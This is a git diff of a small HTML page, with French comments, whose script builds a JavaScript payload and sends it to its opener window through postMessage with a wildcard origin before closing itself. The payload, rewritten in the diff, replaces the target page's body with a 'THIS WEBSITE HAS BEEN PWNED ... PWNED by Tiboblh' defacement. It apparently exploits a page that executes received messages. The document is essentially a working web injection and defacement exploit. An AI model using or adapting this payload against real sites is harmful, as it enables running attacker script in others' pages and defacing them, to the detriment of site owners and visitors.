@@ -6,29 +6,16 @@
 </head>
 <body>
 <script>
-// Ici, on ne met PAS de <html> complet dans le payload.
-// On envoie seulement du JavaScript exécutable sur la page cible.
+// Le payload contient du JavaScript pur qui remplace le body
 const payload = `
-document.body.innerHTML = \`
-  <h1 style="font-size:80px;text-align:center;margin-top:20vh;
-             color:#00ff00;font-family:'Courier New',monospace;
-             text-shadow:0 0 20px #ff0000,0 0 30px #00ffff;">
-    THIS WEBSITE HAS BEEN PWNED
-  </h1>
-  <p style="text-align:center;font-size:24px;color:#00ff00;
-            font-family:'Courier New',monospace;">
-    All systems compromised. Enjoy the chaos!
-  </p>
-  <p style="text-align:center;font-size:16px;color:#ff5555;
-            font-family:'Courier New',monospace;">
-    -- PWNED by Tiboblh --
-  </p>
-\`;
 document.body.style.background = "black";
+document.body.style.color = "#00ff00";
+document.body.style.fontFamily = "'Courier New', monospace";
+document.body.style.textAlign = "center";
 document.body.style.overflow = "hidden";
+document.body.innerHTML = "<h1 style='font-size:80px;text-shadow:0 0 20px #ff0000,0 0 30px #00ffff;margin-top:20vh;'>THIS WEBSITE HAS BEEN PWNED</h1><p style='font-size:24px;'>All systems compromised. Enjoy the chaos!</p><p style='color:#ff5555;margin-top:50px;'>-- PWNED by Tiboblh --</p>";
 `;
 
-// Envoi le JavaScript au parent
 window.opener.postMessage({ maVariable: payload }, '*');
 window.close();
 </script>
